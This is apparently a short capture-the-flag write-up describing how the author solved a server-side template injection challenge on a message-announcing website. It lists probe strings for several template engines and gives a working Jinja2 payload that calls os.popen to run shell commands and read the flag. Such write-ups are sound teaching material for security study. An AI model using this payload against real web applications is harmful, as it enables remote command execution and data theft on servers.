Description:  
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.  
Hints:   
Server Side Template Injection

After you lunchs the Instance, it shows like this:  
<img width="757" height="216" alt="image" src="https://github.com/user-attachments/assets/0d69f037-bc91-43d6-b7f2-15cb2ecf46b3" />

With that hint, it's clearly SSTI. Doing research, i found some payload to testing, if anything can make the server execute my payload:  
`{{7*7}}`  Jinja2/Twig    
`${7*7}`	Freemarker, Thymeleaf  
`<%= 7*7 %>`	Ruby ERB  
`{$7*7}`	Smarty PHP    
I found it's using Jinja2 (Python) after it show "49" as a result.  
I change my payload to `{{ cycler.__init__.__globals__.os.popen('ls').read() }}`  
And see the flag:  
<img width="1299" height="160" alt="image" src="https://github.com/user-attachments/assets/970a7587-0773-43f8-83b0-6e95c99304bb" />  
Change `ls` command to `cat` to read the flag.   
Peace!  
